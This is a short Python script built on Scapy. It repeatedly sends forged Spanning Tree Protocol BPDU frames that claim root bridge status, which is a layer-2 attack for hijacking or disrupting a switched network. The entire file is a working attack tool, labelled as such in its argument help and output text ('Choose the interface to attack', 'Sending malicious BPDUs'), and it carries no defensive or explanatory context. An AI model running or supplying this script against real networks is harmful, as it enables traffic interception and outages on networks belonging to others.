#!/usr/bin/env python3

#by C0ldheim

#Import Scapy
from scapy.all import *
from scapy.layers.l2 import *
import argparse

data = 'STP'
STPMulticast = "01:80:C2:00:00:00"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="iface", help="Choose the interface to attack")
    options = parser.parse_args()
    if not options.iface:
        parser.error ("Please, specify the interface")
    return options

def malicious_stp(iface):
    frame = Ether(src="00:00:00:00:00:11", dst=STPMulticast)
    frame /= LLC()/STP(rootmac="00:00:00:00:00:11", bridgemac="00:00:00:00:00:11")/data
    print ("Sending malicious BPDUs...")
    sendp(frame, iface=options.iface, inter=3, loop=1, verbose=1)


options = get_arguments()
malicious_stp(options.iface)






